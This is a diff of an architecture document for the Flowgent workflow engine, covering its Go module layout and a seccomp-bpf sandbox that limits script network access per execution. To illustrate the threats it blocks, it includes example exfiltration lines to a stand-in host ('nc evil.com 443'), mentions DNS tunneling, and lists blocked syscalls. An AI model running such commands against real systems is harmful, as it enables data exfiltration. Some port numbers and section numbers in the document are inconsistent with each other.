@@ -1,7 +1,7 @@
 # Flowgent Distributed Engine Architecture
 
-**Date:** 2026-05-22
-**Status:** Implemented — three-phase architecture (Design→Schedule→Execute), E2E verified on k3s
+**Date:** 2026-05-27
+**Status:** Implemented — Go multi-module (core + sandbox-exec), seccomp-bpf sandbox isolation, three-phase architecture (Design→Schedule→Execute), E2E verified on k3s
 
 ---
 
@@ -285,6 +285,7 @@ flowgent.io/mode:         "session" | "application"
 | **UI → PG → Controller (three-phase async)** | Decouples authoring from execution; Controller is the only component that writes runs; JM is the only component that executes them |
 | **JM unification: same binary, same poller, same DAG for both modes** | Session: `jobmanager start` loads all flows, scans all runs. Application: `jobmanager start --flow-id <id>` loads single flow, scans only that flow. `deployment.mode` controls AutoScale; `FLOWGENT_NAMESPACE` is a namespace filter safety net |
 | **A2A uses `a2aproject/a2a-go` types directly, not ADK's `adka2a` wrapper** | ADK's A2A server binds to `session.Session`, `genai.Content`, and ADK internal types — all incompatible with Flowgent's DAG orchestration model. The official `a2aproject/a2a-go` SDK provides clean protocol types (`AgentCard`, `Task`, `Message`) without opinionated framework coupling |
+| **Sandbox network isolation via seccomp-bpf + userspace notifier, not iptables** | Per-flow per-node dynamic allowlists require per-execution granularity. iptables is pod-level static (iptables rules apply to all processes in a netns). Istio/envoy is also pod-level via sidecar injection. seccomp-bpf with `SECCOMP_RET_USER_NOTIF` gives **per-thread, per-execution** filtering at the syscall level — the filter is installed dynamically before each script runs and dies with the child process. A userspace notifier goroutine (in the sandbox runner) resolves hosts → IPs and checks each `connect()`/`sendto()`/`sendmsg()` target address against the resolved allowlist by reading `/proc/<pid>/mem`. DNS (port 53) is unconditionally allowed at the BPF level so hostnames can be resolved before connect. SOCK_RAW is unconditionally blocked. See §15 for full design. |
 
 ---
 
@@ -875,7 +876,7 @@ Histogram boundaries (from sample config):
 
 ---
 
-## 15. Key Design Constraints
+## 16. Key Design Constraints
 
 | Constraint | Rationale |
 |-----------|-----------|
@@ -885,28 +886,134 @@ Histogram boundaries (from sample config):
 | Supervisor actions constrained | redirect/retry/inject/abort only |
 | Human node must persist + timeout | DB-backed, resume via API |
 | Map must support nesting | Multi-level fan-out |
+| Sandbox network isolation must be per-execution, not per-pod | Network policy is defined per-flow per-node. The same sandbox pod executes scripts for different flows concurrently. Pod-level mechanisms (iptables, Istio sidecar, K8s NetworkPolicy) cannot enforce per-execution allowlists. seccomp-bpf + userspace notifier gives dynamic per-thread filtering — see §15. |
 
 ---
 
 ## 16. File Map
 
-| File | Role |
+The codebase is a Go workspace (`go.work`) joining 10 modules with a strictly
+acyclic dependency graph. `cmd` is the leaf — it depends on everything.
+`common` is the root — zero dependencies.
+
+```
+common (zero deps)
+  ↑
+model (→ common)
+  ↑
+  ├─ messaging (→ common + model)   [ex-queue]
+  ├─ cache (→ common + model)
+  └─ config (→ common + model + cache)
+       ↑
+       ├─ wallet (→ common + model)   [ex-payments]
+       ├─ notifier (→ config + messaging + model)
+       ├─ sandbox (→ common + model + messaging)   [ex-sandbox-exec]
+       └─ core (→ config + messaging + model + cache + notifier + wallet + sandbox)
+             ↑
+             └─ cmd (→ everything)
+```
+
+| # | Module | Path | Module Path | Depends On |
+|---|--------|------|-------------|------------|
+| 1 | common | `src/common/` | `flowgent/common` | (none) |
+| 2 | model | `src/model/` | `flowgent/model` | common |
+| 3 | messaging | `src/messaging/` | `flowgent/messaging` | common, model |
+| 4 | cache | `src/cache/` | `flowgent/cache` | common, model |
+| 5 | config | `src/config/` | `flowgent/config` | common, model, cache |
+| 6 | wallet | `src/wallet/` | `flowgent/wallet` | common, model |
+| 7 | notifier | `src/notifier/` | `flowgent/notifier` | config, messaging, model |
+| 8 | sandbox | `src/sandbox/` | `flowgent/sandbox` | common, model, messaging |
+| 9 | core | `src/core/` | `flowgent/core` | config, messaging, model, cache, notifier, wallet, sandbox |
+| 10 | cmd | `src/cmd/` | `flowgent/cmd` | all above |
+
+### common (`src/common/src/`) — Module 1 (root)
+
+| Path | Role |
 |------|------|
-| `src/cmd/flowgent/main.go` | CLI entry (cobra): all-in-one, apiserver, wallet, controller, etc. |
-| `src/cmd/flowgent/launch.go` | Subsystem init + JM/TM/Controller/Notifier startup |
-| `src/cmd/flowgent/wallet.go` | Wallet daemon (separate for security isolation) |
-| `src/engine/discovery/` | IDiscoveryClient interface + K8s/static implementations |
-| `src/engine/jobmanager/` | JobManager + per-run JobMaster DAG orchestrator |
-| `src/engine/resourcemanager/` | ResourceManager interface + Local + Kubernetes implementations |
-| `src/engine/trigger/` | ScheduleTrigger — cron-based flow triggering |
-| `src/engine/taskmanager/` | SlotWorker pool + heartbeat |
-| `src/engine/executor/` | 10 TaskExecutor implementations |
-| `src/api/server.go` | REST route registration |
-| `src/api/agentflow.go` | AgentFlow CRUD + trigger handlers |
-| `src/store/` | PostgreSQL + SQLite store implementations |
-| `src/notification/` | Notifier service + channel senders |
-| `src/model/` | Shared types: AgentFlowSpec, Node, Edge, Run, etc. |
-| `deploy/helm/flowgent/` | Helm chart (6 microservices × 2 replicas) |
+| `tracing/` | OTEL tracer/metrics provider; defines its own OTELConfig, MetricsConfig |
+| `utils/` | Structured logger (slog wrapper), utilities |
+
+### model (`src/model/src/`) — Module 2
+
+| Path | Role |
+|------|------|
+| `*.go` | Shared domain types: AgentFlowSpec, Node, Edge, Run, NetworkPolicy, SandboxPolicy, ExecutionPlan, etc. |
+
+### messaging (`src/messaging/src/`) — Module 3 (ex-`queue`)
+
+| Path | Role |
+|------|------|
+| `queue.go` | Queue interface (Push/Pop/Dequeue/Ack/Nack/Heartbeat) + Message/Heartbeat types |
+| `memory.go` | In-memory queue (goroutine-safe) |
+| `mqtt.go` | MQTT queue (EMQX) for distributed mode |
+| `metrics.go` | OTEL metrics for queue operations |
+
+### cache (`src/cache/src/`) — Module 4
+
+| Path | Role |
+|------|------|
+| `cache.go` | ICache interface |
+| `memory.go` | In-memory LRU cache; defines MemoryCacheConfig |
+| `redis.go` | Redis cache (standalone/cluster/sentinel); defines RedisCacheConfig |
+
+### config (`src/config/src/`) — Module 5
+
+| Path | Role |
+|------|------|
+| `config.go` | Top-level ServiceConfig; type aliases to leaf module config types; YAML/viper loading |
+
+### wallet (`src/wallet/src/`) — Module 6 (ex-`payments`)
+
+| Path | Role |
+|------|------|
+| `model.go` | Payment domain types |
+| `wallet/` | Wallet client |
+| `facilitator/` | x402 facilitator |
+| `approvals/` | Human approval persistence |
+| `policy/`, `pwf/`, `x402/`, `providers/`, `receipts/` | Payment subsystem |
+
+### notifier (`src/notifier/src/`) — Module 7
+
+| Path | Role |
+|------|------|
+| `notifier.go` | Notification service + MQTT subscriber + WS hub + channel senders |
+
+### sandbox (`src/sandbox/src/`) — Module 8 (ex-`sandbox-exec`)
+
+| Path | Role |
+|------|------|
+| `sandbox/` | SandboxRunner lifecycle, script execution, policy validation |
+| `seccomp/` | seccomp-bpf filter builder/installer, USER_NOTIF handler, re-exec child |
+
+### core (`src/core/src/`) — Module 9
+
+| Path | Role |
+|------|------|
+| `api/` | REST API handlers (CRUD, trigger, runs, human approval) |
+| `engine/executor/` | 10 TaskExecutor implementations |
+| `engine/jobmanager/` | JobManager + JobMaster DAG orchestrator |
+| `engine/resourcemanager/` | ResourceManager (Local + Kubernetes) |
+| `engine/taskmanager/` | SlotWorker pool + heartbeat |
+| `engine/discovery/`, `engine/checkpoint/`, `engine/trigger/` | Engine subsystems |
+| `store/` | PostgreSQL + SQLite store implementations |
+| `llm/` | LLM client (OpenAI-compatible) + MCP factory |
+| `lock/` | Distributed lock (memory/Redis/Postgres) |
+| `migration/` | DDL migration scripts |
+
+### cmd (`src/cmd/src/flowgent/`) — Module 10 (leaf)
+
+| Path | Role |
+|------|------|
+| `main.go` | CLI entry (cobra): all-in-one, apiserver, controller, jm, tm |
+| `launch.go` | Subsystem init — wires all modules together |
+| `console.go` | Interactive console |
+
+### Deployment
+
+| Path | Role |
+|------|------|
+| `deploy/helm/flowgent/` | Helm chart (7 microservices × 2 replicas) |
+| `deploy/docker/Dockerfile` | Container image |
 
 ---
 
@@ -1041,67 +1148,28 @@ type AgentDef struct {
 
 ## 15. Sandbox — Secure Script Execution
 
-The sandbox subsystem securely executes scripts (Python, Bash, Node) generated by
-agents or skills. It runs as a standalone microservice (`flowgent sandbox start`),
-consuming lightweight trigger messages from the queue and reading/writing files
-through a single persistent **workspace** volume shared with TaskManager pods.
+The sandbox executes scripts (Python, Bash, Node) generated by agents or skills.
+It runs as a standalone microservice (`flowgent sandbox start`), consuming trigger
+messages from the queue and reading/writing files through a shared workspace volume.
 
 ### 15.1 Dual Persistence Model
-
-Flowgent distinguishes two types of persistent data:
 
 | Type | Storage | Survives | Example |
 |------|---------|----------|---------|
 | **Work data** (files) | Workspace volume (hostPath/PVC) | Pod restart, cluster reboot | Code patches, scripts, build artifacts |
-| **Shared memory** (knowledge) | Storage (SQLite / PostgreSQL) | Everything | Agent conversation history, run progress, architecture docs |
-
-The workspace volume is mounted to **every TM and Sandbox pod** so any pod can
-access the files for any run. The storage layer is queried by `agentflow_definition_id`
-to retrieve accumulated knowledge across runs.
+| **Shared memory** (knowledge) | Storage (SQLite / PostgreSQL) | Everything | Agent conversation history, run progress |
 
 ### 15.2 Workspace Path Convention
 
 ```
-{workspace}/
-  └── {tenant}/
-        └── {definition_id}/          ← agentflow definition (e.g. "security-autonomy-fixer-v3")
-              └── runs/
-                    └── {run_id}/      ← one execution (e.g. "run-abc123")
-                          └── plans/
-                                └── {plan_id}/   ← one node (e.g. "plan-xyz789")
-                                      └── {span_id}/  ← one execution attempt (OTEL span)
-                                            ├── script.{py,sh,js}
-                                            ├── result.json
-                                            ├── status
-                                            └── original/   (pre-modification snapshot)
+{workspace}/{tenant}/{definition_id}/runs/{run_id}/plans/{plan_id}/{span_id}/
+  ├── script.{py,sh,js}
+  ├── result.json
+  ├── status
+  └── original/   (pre-modification snapshot)
 ```
 
-**Concrete example** — Security Fixer V3 fixing Rengine (3 runs, each fixing different issues):
-
-```
-/var/flowgent/workspace/
-  └── default/
-        └── security-autonomy-fixer-v3/
-              ├── runs/run-001/plans/plan-fetch-sq/abc123/     # run 1: fetched 700 issues
-              ├── runs/run-001/plans/plan-generate-fix/def456/  # run 1: patched 5 BLOCKERs
-              ├── runs/run-002/plans/plan-fetch-sq/ghi789/     # run 2: re-scanned, 695 remain
-              ├── runs/run-002/plans/plan-generate-fix/jkl012/  # run 2: patched 3 CRITICALs
-              └── runs/run-003/plans/...                        # run 3: final pass
-```
-
-- **Session mode**: Helm creates one cluster-wide workspace `hostPath`. All flows share it, isolated by `{tenant}/{definition_id}` subdirectories.
-- **Application mode**: Controller detects slot shortage, creates a dedicated PVC per `{tenant}/{definition_id}`, and sets `FLOWGENT_SANDBOX_WORKSPACE` env var on new TM/Sandbox pods to point to that PVC.
-- **span_id**: 16-char hex identifier. Each sandbox execution gets a unique span, aligning with OTEL distributed tracing.
-
-### 15.2 CLI
-
-```bash
-./bin/flowgent sandbox start
-./bin/flowgent sandbox stop
-./bin/flowgent sandbox restart
-```
-
-### 15.3 Security Policy (3-Level Override)
+### 15.3 Security Policy — 3-Level Override
 
 | Level | Config Source | Scope |
 |-------|--------------|-------|
@@ -1109,69 +1177,148 @@ to retrieve accumulated knowledge across runs.
 | Flow | `AgentFlowSpec.sandbox_policy` | All nodes in a flow |
 | Node | `Node.network_policy` | Single node |
 
-```yaml
-sandbox:
-  enabled: true
-  image: "flowgent-sandbox:latest"
-  workspace: "/var/flowgent/workspace"   # single persistent volume
-  policy:
-    network:
-      mode: none
-      allowed: []
-    allowed_runtimes: [python3, bash, node]
-    banned_commands: []
-    default_timeout: 120s
-    max_timeout: 600s
-    default_resources:
-      cpu: "500m"
-      memory: "256Mi"
-```
+Resolution: node override > flow override > global default. See
+`model.EffectiveNetworkPolicy()`.
 
-### 15.4 Sandbox Node Type
+### 15.4 Network Isolation — seccomp-bpf + Userspace Notifier
 
-```yaml
-nodes:
-  - id: run-audit
-    type: sandbox
-    runtime: python3
-    script: |
-      import subprocess, json
-      result = subprocess.run(["pip-audit", "--format", "json"], capture_output=True, text=True)
-      print(result.stdout)
-    timeout: 120s
-    resources:
-      cpu: "500m"
-      memory: "256Mi"
-    network_policy:
-      mode: allowlist
-      allowed: ["pypi.org:443"]
-    workspace: "/home/agent/rengine"   # optional: data dir the sandbox reads/writes
-```
+**Why not iptables / Istio / K8s NetworkPolicy?**
 
-### 15.5 Execution Model
+Network policy is defined per-flow per-node. The same sandbox pod executes scripts
+for different flows concurrently. All pod-level mechanisms are **static** — they apply
+uniformly to every process in the pod from the moment the pod starts:
+
+| Mechanism | Level | Dynamic per-execution? | Escape vector |
+|-----------|-------|----------------------|---------------|
+| iptables | pod netns | No — rules apply to all processes | Process with `NET_ADMIN` can delete rules |
+| Istio/envoy sidecar | pod | No — sidecar injected at pod creation | Process can delete iptables redirect rules |
+| K8s NetworkPolicy | pod | No — enforced by CNI at pod boundary | Process inside pod is already past the boundary |
+| ALL_PROXY env | process | Yes, but advisory only | `unset ALL_PROXY; nc evil.com 443` |
+| **seccomp-bpf + notifier** | **per-thread** | **Yes — filter installed before each script** | **Kernel-enforced, process cannot remove** |
+
+**Architecture:**
 
 ```
-TM: SandboxExecutor
-  → build workspace path: {workspace}/{tenant}/{flow_id}/runs/{run_id}/plans/{plan_id}/{span_id}/
-  → write script to path
-  → if node.workspace set: snapshot original files to {path}/original/
-  → push lightweight trigger to queue (path + metadata, no script content)
-  → pop result from queue
-
-Sandbox Worker
-  → dequeue trigger
-  → read script from workspace path
-  → execute in Docker container:
-      -v {workspace_path}:/sandbox:rw          ← script + result
-      -v {node.workspace}:/workspace:rw        ← data dir (if set)
-      --network=none (or allowlist)
-  → validate policy
-  → write result.json + status to workspace path
-  → push result to queue
+SandboxRunner (Go process)
+  │
+  ├─→ Before each script execution:
+  │     1. Pre-resolve allowlist hostnames → IPs
+  │        (e.g. nexus3:8081 → 10.43.162.201:8081)
+  │     2. Build seccomp-bpf filter program:
+  │        - Block socket(AF_INET, SOCK_RAW, *)       → EPERM
+  │        - Block bpf(), init_module(), kexec_load() → EPERM
+  │        - sendto/sendmsg/sendmmsg to port 53       → ALLOW (DNS)
+  │        - connect/sendto/sendmsg/sendmmsg          → USER_NOTIF
+  │        - Everything else                          → ALLOW
+  │     3. Install filter via seccomp(SECCOMP_SET_MODE_FILTER,
+  │        SECCOMP_FILTER_FLAG_TSYNC)
+  │
+  ├─→ Start notifier goroutine:
+  │     - Reads seccomp notify fd
+  │     - For each SECCOMP_RET_USER_NOTIF event:
+  │       - Read /proc/<pid>/mem at args[1] to get sockaddr
+  │       - If (ip, port) in allowlist → SECCOMP_USER_NOTIF_FLAG_CONTINUE
+  │       - Else → respond with error (EPERM)
+  │
+  ├─→ exec.Command("bash", scriptFile)    ← child inherits filter
+  │     - Script calls curl nexus3:8081
+  │     → glibc: getaddrinfo("nexus3") → DNS lookup (UDP 53, allowed by BPF)
+  │     → glibc: connect(fd, {10.43.162.201, 8080})
+  │     → Kernel seccomp: USER_NOTIF → notifier checks IP+port → ALLOW
+  │     → Script calls nc evil.com 443
+  │     → Kernel seccomp: USER_NOTIF → notifier checks IP+port → DENY (EPERM)
+  │
+  └─→ After script exits:
+        - Child process dies → filter auto-released (no cleanup needed)
+        - Notifier goroutine exits
 ```
 
-- **K8s**: Sandbox runs as a Deployment. Workspace mounted via hostPath (session) or PVC (application).
-- **All-in-one**: Everything in-process via subprocess. Workspace is a local directory.
+**Syscall coverage — every egress path blocked:**
+
+| Syscall | Protocol | Intercepted? | Notes |
+|---------|----------|-------------|-------|
+| `connect()` | TCP (and UDP with connected socket) | Yes — BPF sends to notifier | Most common path (curl, wget, http clients) |
+| `sendto()` | UDP (and TCP fast-path) | Yes — BPF sends to notifier | DNS allowed unconditionally (port 53) |
+| `sendmsg()` | UDP/TCP with scatter-gather | Yes — BPF sends to notifier | Used by sendmmsg, advanced socket APIs |
+| `sendmmsg()` | Batch sendmsg | Yes — BPF sends to notifier | Same check as sendmsg |
+| `socket()` | Socket creation | Yes — BPF blocks SOCK_RAW directly | Prevents raw IP packet injection |
+| `exec 3<>/dev/tcp/h/p` | Bash TCP pseudo-device | Yes — bash internally calls connect() | No special handling needed |
+| `bpf()` | BPF syscall | Yes — blocked unconditionally | Prevents process from installing its own seccomp |
+| `init_module()` | Kernel module load | Yes — blocked unconditionally | Privilege escalation prevention |
+| `kexec_load()` | Kernel execution | Yes — blocked unconditionally | Privilege escalation prevention |
+| `perf_event_open()` | Performance monitoring | Yes — blocked unconditionally | Can be used for side-channel attacks |
+
+**DNS — why it's unconditionally allowed at the BPF level:**
+
+Standard DNS resolution in glibc uses `sendto()` with the resolver address (e.g.,
+`127.0.0.1:53` or the pod's DNS server). The target address is passed directly in
+the syscall arguments, not through a prior `connect()`. Allowing `sendto`/`sendmsg`
+to port 53 lets the script resolve hostnames. The actual TCP/UDP connections to
+the resolved IPs are then checked by the notifier.
+
+This means hostname leak via DNS queries IS possible (the script can `dig` any
+domain). But the actual data exfiltration connection is blocked at the `connect()`
+level. If DNS exfiltration itself is a concern (TXT record tunneling, ~200 bytes
+per query), the DNS port can be restricted to specific resolver IPs in the future.
+
+**Why not `SECCOMP_RET_TRAP` (SIGSYS)?** SIGSYS kills the process. For network
+filtering, we need "allow some, deny others" — USER_NOTIF is the only mechanism
+that can inspect arguments and make a per-call decision without killing the process.
+
+**Why not `SECCOMP_RET_ERRNO` directly?** ERRNO returns immediately without
+inspecting the target address. We can't distinguish `nexus3:8081` (allowed) from
+`evil.com:443` (denied) without reading the sockaddr.
+
+**Docker mode:** When `sandbox.image` is configured, the Docker container runs with
+`--network=none` plus the seccomp filter as an additional layer. The seccomp filter
+is still installed on the docker/docker process that spawns the container, providing
+defense-in-depth.
+
+**Process mode (no Docker):** seccomp filter is the primary and only enforcement
+mechanism. Installed on the child process via `exec.Cmd.SysProcAttr`.
+
+### 15.5 Execution Model (Multi-Module)
+
+The sandbox subsystem spans two Go modules:
+
+```
+src/core/ (engine)                       src/sandbox-exec/ (executor)
+─────────────────────────               ─────────────────────────
+SandboxExecutor (TM side)               SandboxRunner (worker side)
+  → Build workspace path                  → Dequeue trigger
+  → Write script + snapshot               → Read script from path
+  → Push trigger to queue ───MQTT──→      → BuildFilter(network_policy)
+  → Pop result ←────────────MQTT──        → Install seccomp (TSYNC)
+                                           → Start notifier goroutine
+                                           → Execute script
+                                           → Write result.json
+                                           → Push result to queue
+```
+
+Communication between modules is via queue messages only — no Go import dependency.
+The `SandboxExecutor` in core and `SandboxRunner` in sandbox-exec share the trigger
+message format (defined in core's `model.SandboxTrigger`) and the workspace volume.
+
+```
+Sandbox Worker (per-execution lifecycle):
+  → Dequeue trigger
+  → Read script from workspace path
+  → Pre-resolve allowlist hosts → IPs
+  → Build seccomp-bpf filter from resolved IPs + port list
+  → Install filter (SECCOMP_FILTER_FLAG_TSYNC)
+  → Start notifier goroutine (reads seccomp notify fd)
+  → Execute: bash/python3/node script.sh
+  → Wait for child process exit
+  → Notifier auto-exits (filter dies with child)
+  → Write result.json + status to workspace path
+  → Push result to queue
+```
+
+### 15.6 CLI
+
+```bash
+./bin/flowgent sandbox start
+```
 
 ---
 
